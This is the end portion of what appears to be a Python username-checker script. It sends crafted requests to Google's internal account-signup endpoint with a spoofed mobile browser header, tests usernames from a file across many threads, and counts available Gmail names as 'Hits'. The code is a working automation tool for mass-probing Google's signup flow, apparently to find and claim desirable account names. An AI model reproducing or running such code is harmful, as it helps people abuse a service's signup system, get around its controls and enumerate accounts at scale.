qAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(self.birthday[0], self.birthday[1], self.birthday[2], at)
            r = self.ses.post(
                'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                params=params,
                headers=headers,
                data=data,
            ).text
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                'x-goog-ext-391502476-jspb': '["' + s1 + '"]',
                'x-same-domain': '1',
            }
            params = {
                'rpcids': 'NHJMOd',
                'source-path': '/lifecycle/steps/signup/username',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }
            data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email, at)
            r = self.ses.post(
                'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                params=params,
                headers=headers,
                data=data,
            ).text
            if 'steps/signup/password' in r:
                self.ge += 1
                email = email + "@gmail.com"
                self.domin = email.split("@")[1]
                self.info(email)
                sys.stdout.write(f"\r{BOLD}{PURPLE}[Dev: PS] Hits : {RESET}{self.ge} | {BOLD}{CYAN}False: {RESET}{self.bt} | {BOLD}{PURPLE}No: {RESET}{self.be}")
                sys.stdout.flush()

            else:
                self.be += 1
                sys.stdout.write(f"\r{BOLD}{PURPLE}[Dev: PS] Hits : {RESET}{self.ge} | {BOLD}{CYAN}False: {RESET}{self.bt} | {BOLD}{PURPLE}No: {RESET}{self.be}")
                sys.stdout.flush()
        except Exception as e:
            ''

    def admin_gmail(self):
        try:
            file = open(self.file, 'r').read().splitlines()
        except:
            os.system('cls')
            print(f"{BOLD}{CYAN}السته غير موجوده  ! {RESET}")
            exit()
        with F300(max_workers=self.max) as executor:
            futures = [executor.submit(self.API_CH, user + "@gmail.com") for user in file]
            for future in futures:
                future.result()


HSO()